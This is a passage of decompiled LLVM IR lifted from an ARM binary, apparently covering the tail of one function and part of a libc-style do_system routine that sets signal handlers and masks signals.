  %v9_28c48 = icmp eq i32 %v2_28c44, %v1_28c48.pre
  br i1 %v9_28c48, label %dec_label_pc_28c50, label %dec_label_pc_28c68

dec_label_pc_28c64:                               ; preds = %dec_label_pc_28c50
  %v0_28c64 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_28c68

dec_label_pc_28c68:                               ; preds = %dec_label_pc_28c30, %dec_label_pc_28c50.dec_label_pc_28c44_crit_edge, %dec_label_pc_28c64
  %v0_28c68 = phi i32 [ %v0_28c64, %dec_label_pc_28c64 ], [ %v2_28c4436, %dec_label_pc_28c30 ], [ %v2_28c44, %dec_label_pc_28c50.dec_label_pc_28c44_crit_edge ]
  %v1_28c68 = phi i32 [ %v0_28c64, %dec_label_pc_28c64 ], [ 0, %dec_label_pc_28c30 ], [ %v1_28c48.pre, %dec_label_pc_28c50.dec_label_pc_28c44_crit_edge ]
  %v3_28c68 = icmp uge i32 %v0_28c68, %v1_28c68
  store i1 %v3_28c68, i1* %cpsr_c.global-to-local, align 1
  %v9_28c68 = icmp eq i32 %v0_28c68, %v1_28c68
  br i1 %v9_28c68, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_28c68
  %v1_28c6c = load i32, i32* @r6, align 4
  store i32 %v1_28c6c, i32* %r0.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_28c68, %bb
  store i32 167028, i32* @lr, align 4
  %v1_28c70 = xor i1 %v9_28c68, true
  call void @__pseudo_cond_branch(i1 %v1_28c70, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  store i32 27464, i32* %r2.global-to-local, align 4
  %v0_28c78 = load i32, i32* @r5, align 4
  %v2_28c78 = add i32 %v0_28c78, 27464
  %v3_28c78 = inttoptr i32 %v2_28c78 to i32*
  %v4_28c78 = load i32, i32* %v3_28c78, align 4
  %v1_28c7c = add i32 %v4_28c78, -1
  store i32 %v1_28c7c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28c80 = icmp eq i32 %v1_28c7c, 0
  store i32 %v1_28c7c, i32* %v3_28c78, align 4
  br i1 %v2_28c80, label %dec_label_pc_28c8c, label %dec_label_pc_28cb4

dec_label_pc_28c8c:                               ; preds = %bb18
  %v0_28c90 = load i32, i32* @r4, align 4
  store i32 %v0_28c90, i32* %r2.global-to-local, align 4
  %v0_28c94 = load i32, i32* @r5, align 4
  %v2_28c94 = add i32 %v0_28c94, 27444
  store i32 %v2_28c94, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_28c9c = call i32 @__libc_sigaction(i32 3, i32 %v2_28c94, i32 %v0_28c90)
  %v0_28ca4 = load i32, i32* @r4, align 4
  store i32 %v0_28ca4, i32* %r2.global-to-local, align 4
  %v0_28ca8 = load i32, i32* @r5, align 4
  %v2_28ca8 = add i32 %v0_28ca8, 27424
  store i32 %v2_28ca8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_28cb0 = call i32 @__libc_sigaction(i32 2, i32 %v2_28ca8, i32 %v0_28ca4)
  store i32 %v3_28cb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28cb4

dec_label_pc_28cb4:                               ; preds = %bb18, %dec_label_pc_28c8c, %dec_label_pc_28ce4
  %v0_28cb4 = load i32, i32* @r5, align 4
  %v1_28cb4 = load i32, i32* @r7, align 4
  %v2_28cb4 = add i32 %v1_28cb4, %v0_28cb4
  %v3_28cb4 = inttoptr i32 %v2_28cb4 to i32*
  %v4_28cb4 = load i32, i32* %v3_28cb4, align 4
  store i32 %v4_28cb4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_28cbc = load i32, i32* @r6, align 4
  store i32 %v0_28cbc, i32* %r2.global-to-local, align 4
  %v1_28cc023 = inttoptr i32 %v0_28cbc to i32*
  %v2_28cc024 = load i32, i32* %v1_28cc023, align 4
  %v3_28cc426 = icmp uge i32 %v2_28cc024, %v4_28cb4
  store i1 %v3_28cc426, i1* %cpsr_c.global-to-local, align 1
  %v9_28cc432 = icmp eq i32 %v2_28cc024, %v4_28cb4
  br i1 %v9_28cc432, label %dec_label_pc_28ccc, label %dec_label_pc_28ce4

dec_label_pc_28ccc:                               ; preds = %dec_label_pc_28cb4, %dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge
  %v0_28ccc33 = phi i32 [ %v1_28cc4.pre, %dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge ], [ %v4_28cb4, %dec_label_pc_28cb4 ]
  store i32 %v0_28ccc33, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28cdc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28cdc, label %dec_label_pc_28ce0, label %dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge

dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge:  ; preds = %dec_label_pc_28ccc
  %v0_28cc0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28cc4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28cc0 = inttoptr i32 %v0_28cc0.pre to i32*
  %v2_28cc0 = load i32, i32* %v1_28cc0, align 4
  %v3_28cc4 = icmp uge i32 %v2_28cc0, %v1_28cc4.pre
  store i1 %v3_28cc4, i1* %cpsr_c.global-to-local, align 1
  %v9_28cc4 = icmp eq i32 %v2_28cc0, %v1_28cc4.pre
  br i1 %v9_28cc4, label %dec_label_pc_28ccc, label %dec_label_pc_28ce4

dec_label_pc_28ce0:                               ; preds = %dec_label_pc_28ccc
  %v0_28ce0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_28ce4

dec_label_pc_28ce4:                               ; preds = %dec_label_pc_28cb4, %dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge, %dec_label_pc_28ce0
  %v0_28cec = phi i32 [ %v0_28ce0, %dec_label_pc_28ce0 ], [ %v2_28cc024, %dec_label_pc_28cb4 ], [ %v2_28cc0, %dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge ]
  %v1_28ce4 = phi i32 [ %v0_28ce0, %dec_label_pc_28ce0 ], [ %v4_28cb4, %dec_label_pc_28cb4 ], [ %v1_28cc4.pre, %dec_label_pc_28ccc.dec_label_pc_28cc0_crit_edge ]
  %v3_28ce4 = icmp uge i32 %v0_28cec, %v1_28ce4
  store i1 %v3_28ce4, i1* %cpsr_c.global-to-local, align 1
  %v9_28ce4 = icmp eq i32 %v0_28cec, %v1_28ce4
  br i1 %v9_28ce4, label %dec_label_pc_28cec, label %dec_label_pc_28cb4

dec_label_pc_28cec:                               ; preds = %dec_label_pc_28ce4
  %v2_28cec = icmp ne i32 %v1_28ce4, 0
  store i1 %v2_28cec, i1* %cpsr_c.global-to-local, align 1
  %v7_28cf0 = icmp slt i32 %v1_28ce4, 2
  br i1 %v7_28cf0, label %dec_label_pc_28cec.dec_label_pc_28d0c_crit_edge, label %dec_label_pc_28cf4

dec_label_pc_28cec.dec_label_pc_28d0c_crit_edge:  ; preds = %dec_label_pc_28cec
  %v1_28d14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28d0c

dec_label_pc_28cf4:                               ; preds = %dec_label_pc_28cec
  %v0_28cf4 = load i32, i32* @r6, align 4
  store i32 %v0_28cf4, i32* %r0.global-to-local, align 4
  %v0_28cf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_28cf8 = add i32 %v0_28cf8, 129
  store i32 %v1_28cf8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28d0c

dec_label_pc_28d0c:                               ; preds = %dec_label_pc_28cec.dec_label_pc_28d0c_crit_edge, %dec_label_pc_28cf4
  %v1_28d14 = phi i32 [ %v1_28d14.pre, %dec_label_pc_28cec.dec_label_pc_28d0c_crit_edge ], [ %v0_28cf4, %dec_label_pc_28cf4 ]
  %v2_28d10 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_28d10, i32* %r4.global-to-local, align 4
  ret i32 %v1_28d14

; uselistorder directives
  uselistorder i32 %v0_28ce0, { 1, 0 }
  uselistorder i32 %v1_28cc4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_28c64, { 1, 0 }
  uselistorder i32 %v1_28c48.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_28c08, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 11, 2, 4, 3, 5, 6, 7, 8, 12, 9, 10, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 8, 9, 3, 4, 5, 10, 11, 6, 7 }
  uselistorder label %dec_label_pc_28d0c, { 1, 0 }
  uselistorder label %dec_label_pc_28ce4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28ccc, { 1, 0 }
  uselistorder label %dec_label_pc_28cb4, { 2, 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_28c68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28c50, { 1, 0 }
  uselistorder label %dec_label_pc_28c30, { 1, 0 }
}

define i32 @function_28d20(i32 %arg1) local_unnamed_addr {
dec_label_pc_28d20:
  %v0_28d20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_28d20, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_28d20
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_28d20, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @do_system() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %v3_28d30 = load i32, i32* @r4, align 4
  %v6_28d30 = load i32, i32* @r5, align 4
  %v9_28d30 = load i32, i32* @r6, align 4
  %v12_28d30 = load i32, i32* @r7, align 4
  %v15_28d30 = load i32, i32* @r8, align 4
  %v21_28d30 = load i32, i32* @lr, align 4
  %v2_28d38 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_28d38, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v3_28d50 = bitcast i32* %stack_var_-100 to i8*
  %v4_28d50 = call i32 @__GI_memset(i8* %v3_28d50, i32 0, i32 20)
  store i32 27468, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 27468), i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-100, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 27468), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_28d70161 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 27468) to i32*), align 4
  store i32 %v2_28d70161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_28d74163 = icmp eq i32 %v2_28d70161, 0
  br i1 %v9_28d74163, label %dec_label_pc_28d7c, label %dec_label_pc_28d94

dec_label_pc_28d7c:                               ; preds = %entry, %dec_label_pc_28d7c.dec_label_pc_28d70_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28d8c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28d8c, label %dec_label_pc_28d90, label %dec_label_pc_28d7c.dec_label_pc_28d70_crit_edge

dec_label_pc_28d7c.dec_label_pc_28d70_crit_edge:  ; preds = %dec_label_pc_28d7c
  %v0_28d70.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28d74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28d70 = inttoptr i32 %v0_28d70.pre to i32*
  %v2_28d70 = load i32, i32* %v1_28d70, align 4
  store i32 %v2_28d70, i32* %r3.global-to-local, align 4
  %v3_28d74 = icmp uge i32 %v2_28d70, %v1_28d74.pre
  store i1 %v3_28d74, i1* %cpsr_c.global-to-local, align 1
  %v9_28d74 = icmp eq i32 %v2_28d70, %v1_28d74.pre
  br i1 %v9_28d74, label %dec_label_pc_28d7c, label %dec_label_pc_28d94

dec_label_pc_28d90:                               ; preds = %dec_label_pc_28d7c
  %v0_28d90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28d90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28d94

dec_label_pc_28d94:                               ; preds = %entry, %dec_label_pc_28d7c.dec_label_pc_28d70_crit_edge, %dec_label_pc_28d90
  %v0_28d94 = phi i32 [ %v0_28d90, %dec_label_pc_28d90 ], [ %v2_28d70161, %entry ], [ %v2_28d70, %dec_label_pc_28d7c.dec_label_pc_28d70_crit_edge ]
  %v1_28d94 = phi i32 [ %v0_28d90, %dec_label_pc_28d90 ], [ 0, %entry ], [ %v1_28d74.pre, %dec_label_pc_28d7c.dec_label_pc_28d70_crit_edge ]
  %v3_28d94 = icmp uge i32 %v0_28d94, %v1_28d94
  store i1 %v3_28d94, i1* %cpsr_c.global-to-local, align 1
  %v9_28d94 = icmp eq i32 %v0_28d94, %v1_28d94
  br i1 %v9_28d94, label %bb89, label %bb

bb:                                               ; preds = %dec_label_pc_28d94
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_28d94, %bb
  store i32 167328, i32* @lr, align 4
  %v1_28d9c = xor i1 %v9_28d94, true
  call void @__pseudo_cond_branch(i1 %v1_28d9c, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  store i32 27464, i32* @r4, align 4
  %v0_28da4 = load i32, i32* @r6, align 4
  %v2_28da4 = add i32 %v0_28da4, 27464
  %v3_28da4 = inttoptr i32 %v2_28da4 to i32*
  %v4_28da4 = load i32, i32* %v3_28da4, align 4
  %v1_28da8 = add i32 %v4_28da4, 1
  store i32 %v1_28da8, i32* %r3.global-to-local, align 4
  %v2_28dac = icmp ne i32 %v1_28da8, 0
  store i1 %v2_28dac, i1* %cpsr_c.global-to-local, align 1
  %v7_28dac = icmp eq i32 %v4_28da4, 0
  store i32 %v1_28da8, i32* %v3_28da4, align 4
  br i1 %v7_28dac, label %dec_label_pc_28db8, label %dec_label_pc_28e1c

dec_label_pc_28db8:                               ; preds = %bb89
  %v0_28dc0 = load i32, i32* @r6, align 4
  %v2_28dc0 = add i32 %v0_28dc0, 27424
  store i32 %v2_28dc0, i32* %r2.global-to-local, align 4
  store i32 %v2_28d38, i32* %r1.global-to-local, align 4
  %v3_28dc8 = call i32 @__libc_sigaction(i32 2, i32 %v2_28d38, i32 %v2_28dc0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_28dcc = icmp slt i32 %v3_28dc8, 0
  br i1 %v1_28dcc, label %.thread64, label %dec_label_pc_28de0

.thread64:                                        ; preds = %dec_label_pc_28db8
  %v3_28dd0 = load i32, i32* @r6, align 4
  %v4_28dd0 = load i32, i32* @r4, align 4
  %v5_28dd0 = add i32 %v4_28dd0, %v3_28dd0
  %v6_28dd0 = inttoptr i32 %v5_28dd0 to i32*
  %v7_28dd0 = load i32, i32* %v6_28dd0, align 4
  %v4_28dd4 = add i32 %v7_28dd0, -1
  store i32 %v4_28dd4, i32* %r3.global-to-local, align 4
  store i32 %v4_28dd4, i32* %v6_28dd0, align 4
  br label %dec_label_pc_28f3c

dec_label_pc_28de0:                               ; preds = %dec_label_pc_28db8
  store i32 %v2_28d38, i32* %r1.global-to-local, align 4
  %v0_28de8 = load i32, i32* @r6, align 4
  %v2_28de8 = add i32 %v0_28de8, 27444
  store i32 %v2_28de8, i32* %r2.global-to-local, align 4
  %v3_28df0 = call i32 @__libc_sigaction(i32 3, i32 %v2_28d38, i32 %v2_28de8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_28df4 = icmp slt i32 %v3_28df0, 0
  br i1 %v1_28df4, label %dec_label_pc_28dfc, label %dec_label_pc_28e1c

dec_label_pc_28dfc:                               ; preds = %dec_label_pc_28de0
  store i32 105256, i32* %r2.global-to-local, align 4
  %v0_28e00 = load i32, i32* @r6, align 4
  %v1_28e00 = load i32, i32* @r4, align 4
  %v2_28e00 = add i32 %v1_28e00, %v0_28e00
  %v3_28e00 = inttoptr i32 %v2_28e00 to i32*
  %v4_28e00 = load i32, i32* %v3_28e00, align 4
  store i32 %v4_28e00, i32* %r3.global-to-local, align 4
  %v3_28e04 = load i16, i16* @global_var_42934.3040, align 2
  %v4_28e04 = sext i16 %v3_28e04 to i32
  store i32 %v4_28e04, i32* %r2.global-to-local, align 4
  %v0_28e08 = call i32 @__aeabi_read_tp()
  %v1_28e0c = load i32, i32* %r2.global-to-local, align 4
  %v2_28e0c = add i32 %v1_28e0c, %v0_28e08
  %v3_28e0c = inttoptr i32 %v2_28e0c to i32*
  %v4_28e0c = load i32, i32* %v3_28e0c, align 4
  store i32 %v4_28e0c, i32* @r5, align 4
  %v0_28e10 = load i32, i32* %r3.global-to-local, align 4
  %v1_28e10 = add i32 %v0_28e10, -1
  store i32 %v1_28e10, i32* %r3.global-to-local, align 4
  %v1_28e14 = load i32, i32* @r6, align 4
  %v2_28e14 = load i32, i32* @r4, align 4
  %v3_28e14 = add i32 %v2_28e14, %v1_28e14
  %v4_28e14 = inttoptr i32 %v3_28e14 to i32*
  store i32 %v1_28e10, i32* %v4_28e14, align 4
  br label %dec_label_pc_28f18

dec_label_pc_28e1c:                               ; preds = %dec_label_pc_28de0, %bb89
  store i32 27468, i32* @r7, align 4
  %v0_28e20 = load i32, i32* @r6, align 4
  %v2_28e20 = add i32 %v0_28e20, 27468
  store i32 %v2_28e20, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_28e24

dec_label_pc_28e24:                               ; preds = %dec_label_pc_28e54.dec_label_pc_28e24_crit_edge, %dec_label_pc_28e1c
  %v0_28e2c = phi i32 [ %v0_28e2c.pre, %dec_label_pc_28e54.dec_label_pc_28e24_crit_edge ], [ %v2_28e20, %dec_label_pc_28e1c ]
  %v1_28e24 = phi i32 [ %v1_28e24.pre, %dec_label_pc_28e54.dec_label_pc_28e24_crit_edge ], [ 27468, %dec_label_pc_28e1c ]
  %v0_28e24 = phi i32 [ %v0_28e24.pre, %dec_label_pc_28e54.dec_label_pc_28e24_crit_edge ], [ %v0_28e20, %dec_label_pc_28e1c ]
  %v2_28e24 = add i32 %v0_28e24, %v1_28e24
  %v3_28e24 = inttoptr i32 %v2_28e24 to i32*
  %v4_28e24 = load i32, i32* %v3_28e24, align 4
  store i32 %v4_28e24, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_28e2c, i32* %r2.global-to-local, align 4
  %v1_28e30148 = inttoptr i32 %v0_28e2c to i32*
  %v2_28e30149 = load i32, i32* %v1_28e30148, align 4
  store i32 %v2_28e30149, i32* %r3.global-to-local, align 4
  %v3_28e34151 = icmp uge i32 %v2_28e30149, %v4_28e24
  store i1 %v3_28e34151, i1* %cpsr_c.global-to-local, align 1
  %v9_28e34157 = icmp eq i32 %v2_28e30149, %v4_28e24
  br i1 %v9_28e34157, label %dec_label_pc_28e3c, label %dec_label_pc_28e54

dec_label_pc_28e3c:                               ; preds = %dec_label_pc_28e24, %dec_label_pc_28e3c.dec_label_pc_28e30_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28e4c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28e4c, label %dec_label_pc_28e50, label %dec_label_pc_28e3c.dec_label_pc_28e30_crit_edge

dec_label_pc_28e3c.dec_label_pc_28e30_crit_edge:  ; preds = %dec_label_pc_28e3c
  %v0_28e30.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28e34.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28e30 = inttoptr i32 %v0_28e30.pre to i32*
  %v2_28e30 = load i32, i32* %v1_28e30, align 4
  store i32 %v2_28e30, i32* %r3.global-to-local, align 4
  %v3_28e34 = icmp uge i32 %v2_28e30, %v1_28e34.pre
  store i1 %v3_28e34, i1* %cpsr_c.global-to-local, align 1
  %v9_28e34 = icmp eq i32 %v2_28e30, %v1_28e34.pre
  br i1 %v9_28e34, label %dec_label_pc_28e3c, label %dec_label_pc_28e54

dec_label_pc_28e50:                               ; preds = %dec_label_pc_28e3c
  %v0_28e50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28e50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28e54

dec_label_pc_28e54:                               ; preds = %dec_label_pc_28e24, %dec_label_pc_28e3c.dec_label_pc_28e30_crit_edge, %dec_label_pc_28e50
  %v0_28e5c = phi i32 [ %v0_28e50, %dec_label_pc_28e50 ], [ %v2_28e30149, %dec_label_pc_28e24 ], [ %v2_28e30, %dec_label_pc_28e3c.dec_label_pc_28e30_crit_edge ]
  %v1_28e54 = phi i32 [ %v0_28e50, %dec_label_pc_28e50 ], [ %v4_28e24, %dec_label_pc_28e24 ], [ %v1_28e34.pre, %dec_label_pc_28e3c.dec_label_pc_28e30_crit_edge ]
  %v3_28e54 = icmp uge i32 %v0_28e5c, %v1_28e54
  store i1 %v3_28e54, i1* %cpsr_c.global-to-local, align 1
  %v9_28e54 = icmp eq i32 %v0_28e5c, %v1_28e54
  br i1 %v9_28e54, label %dec_label_pc_28e5c, label %dec_label_pc_28e54.dec_label_pc_28e24_crit_edge

dec_label_pc_28e54.dec_label_pc_28e24_crit_edge:  ; preds = %dec_label_pc_28e54
  %v0_28e24.pre = load i32, i32* @r6, align 4
  %v1_28e24.pre = load i32, i32* @r7, align 4
  %v0_28e2c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_28e24

dec_label_pc_28e5c:                               ; preds = %dec_label_pc_28e54
  %v2_28e5c = icmp ne i32 %v1_28e54, 0
  store i1 %v2_28e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_28e60 = icmp slt i32 %v1_28e54, 2
  br i1 %v7_28e60, label %dec_label_pc_28e7c, label %dec_label_pc_28e64

dec_label_pc_28e64:                               ; preds = %dec_label_pc_28e5c
  %v0_28e68 = load i32, i32* %r1.global-to-local, align 4
  %v1_28e68 = add i32 %v0_28e68, 129
  store i32 %v1_28e68, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* @r7, align 4
  br label %dec_label_pc_28e7c

dec_label_pc_28e7c:                               ; preds = %dec_label_pc_28e64, %dec_label_pc_28e5c
  %v3_28e7c = load i32, i32* %stack_var_-88, align 4
  %v1_28e84 = or i32 %v3_28e7c, 65536
  store i32 %v1_28e84, i32* %r3.global-to-local, align 4
  %v2_28e88 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_28e88, i32* %r1.global-to-local, align 4
  %v2_28e8c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_28e8c, i32* %r2.global-to-local, align 4
  store i32 %v1_28e84, i32* %stack_var_-88, align 4
  %v4_28e94 = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-88, i32 %v2_28e8c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_28e98 = icmp slt i32 %v4_28e94, 0
  br i1 %v1_28e98, label %dec_label_pc_28ea0, label %dec_label_pc_28fa4

dec_label_pc_28ea0:                               ; preds = %dec_label_pc_28e7c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_28ea4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_28ea4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_28eac121 = inttoptr i32 %v0_28ea4 to i32*
  %v2_28eac122 = load i32, i32* %v1_28eac121, align 4
  store i32 %v2_28eac122, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_28eb0124 = icmp eq i32 %v2_28eac122, 0
  br i1 %v9_28eb0124, label %dec_label_pc_28eb8, label %dec_label_pc_28ed0

dec_label_pc_28eb8:                               ; preds = %dec_label_pc_28ea0, %dec_label_pc_28eb8.dec_label_pc_28eac_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28ec8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28ec8, label %dec_label_pc_28ecc, label %dec_label_pc_28eb8.dec_label_pc_28eac_crit_edge

dec_label_pc_28eb8.dec_label_pc_28eac_crit_edge:  ; preds = %dec_label_pc_28eb8
  %v0_28eac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28eb0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28eac = inttoptr i32 %v0_28eac.pre to i32*
  %v2_28eac = load i32, i32* %v1_28eac, align 4
  store i32 %v2_28eac, i32* %r3.global-to-local, align 4
  %v3_28eb0 = icmp uge i32 %v2_28eac, %v1_28eb0.pre
  store i1 %v3_28eb0, i1* %cpsr_c.global-to-local, align 1
  %v9_28eb0 = icmp eq i32 %v2_28eac, %v1_28eb0.pre
  br i1 %v9_28eb0, label %dec_label_pc_28eb8, label %dec_label_pc_28ed0

dec_label_pc_28ecc:                               ; preds = %dec_label_pc_28eb8
  %v0_28ecc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28ecc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28ed0

dec_label_pc_28ed0:                               ; preds = %dec_label_pc_28ea0, %dec_label_pc_28eb8.dec_label_pc_28eac_crit_edge, %dec_label_pc_28ecc
  %v0_28ed0 = phi i32 [ %v0_28ecc, %dec_label_pc_28ecc ], [ %v2_28eac122, %dec_label_pc_28ea0 ], [ %v2_28eac, %dec_label_pc_28eb8.dec_label_pc_28eac_crit_edge ]
  %v1_28ed0 = phi i32 [ %v0_28ecc, %dec_label_pc_28ecc ], [ 0, %dec_label_pc_28ea0 ], [ %v1_28eb0.pre, %dec_label_pc_28eb8.dec_label_pc_28eac_crit_edge ]
  %v3_28ed0 = icmp uge i32 %v0_28ed0, %v1_28ed0
  store i1 %v3_28ed0, i1* %cpsr_c.global-to-local, align 1
  %v9_28ed0 = icmp eq i32 %v0_28ed0, %v1_28ed0
  br i1 %v9_28ed0, label %bb91, label %bb90

bb90:                                             ; preds = %dec_label_pc_28ed0
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_28ed0, %bb90
  store i32 167644, i32* @lr, align 4
  %v1_28ed8 = xor i1 %v9_28ed0, true
  call void @__pseudo_cond_branch(i1 %v1_28ed8, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  store i32 27464, i32* %r2.global-to-local, align 4
  %v0_28ee0 = load i32, i32* @r6, align 4
  %v2_28ee0 = add i32 %v0_28ee0, 27464
  %v3_28ee0 = inttoptr i32 %v2_28ee0 to i32*
  %v4_28ee0 = load i32, i32* %v3_28ee0, align 4
  store i32 %v4_28ee0, i32* %r3.global-to-local, align 4
  %v1_28ee4 = add i32 %v4_28ee0, -1
  store i32 %v1_28ee4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28ee8 = icmp eq i32 %v1_28ee4, 0
  store i32 %v1_28ee4, i32* %v3_28ee0, align 4
  br i1 %v2_28ee8, label %dec_label_pc_28ef4, label %dec_label_pc_28f3c

dec_label_pc_28ef4:                               ; preds = %bb91
  store i32 105004, i32* %r3.global-to-local, align 4
  store i32 27444, i32* %r1.global-to-local, align 4
  %v0_28efc = call i32 @__aeabi_read_tp()
  %v3_28f00 = load i16, i16* @global_var_42934.3040, align 2
  %v4_28f00 = sext i16 %v3_28f00 to i32
  store i32 %v4_28f00, i32* %r3.global-to-local, align 4
  %v2_28f04 = add i32 %v4_28f00, %v0_28efc
  %v3_28f04 = inttoptr i32 %v2_28f04 to i32*
  %v4_28f04 = load i32, i32* %v3_28f04, align 4
  store i32 %v4_28f04, i32* @r5, align 4
  %v0_28f08 = load i32, i32* @r6, align 4
  %v1_28f08 = load i32, i32* %r1.global-to-local, align 4
  %v2_28f08 = add i32 %v1_28f08, %v0_28f08
  store i32 %v2_28f08, i32* %r1.global-to-local, align 4
  %v0_28f0c = load i32, i32* @r4, align 4
  store i32 %v0_28f0c, i32* %r2.global-to-local, align 4
  %v3_28f14 = call i32 @__libc_sigaction(i32 3, i32 %v2_28f08, i32 %v0_28f0c)
  br label %dec_label_pc_28f18

dec_label_pc_28f18:                               ; preds = %dec_label_pc_28dfc, %dec_label_pc_28ef4
  %v0_28f20 = load i32, i32* @r6, align 4
  %v2_28f20 = add i32 %v0_28f20, 27424
  store i32 %v2_28f20, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_28f28 = call i32 @__libc_sigaction(i32 2, i32 %v2_28f20, i32 0)
  store i32 104952, i32* %r3.global-to-local, align 4
  %v0_28f30 = call i32 @__aeabi_read_tp()
  %v3_28f34 = load i16, i16* @global_var_42934.3040, align 2
  %v4_28f34 = sext i16 %v3_28f34 to i32
  store i32 %v4_28f34, i32* %r3.global-to-local, align 4
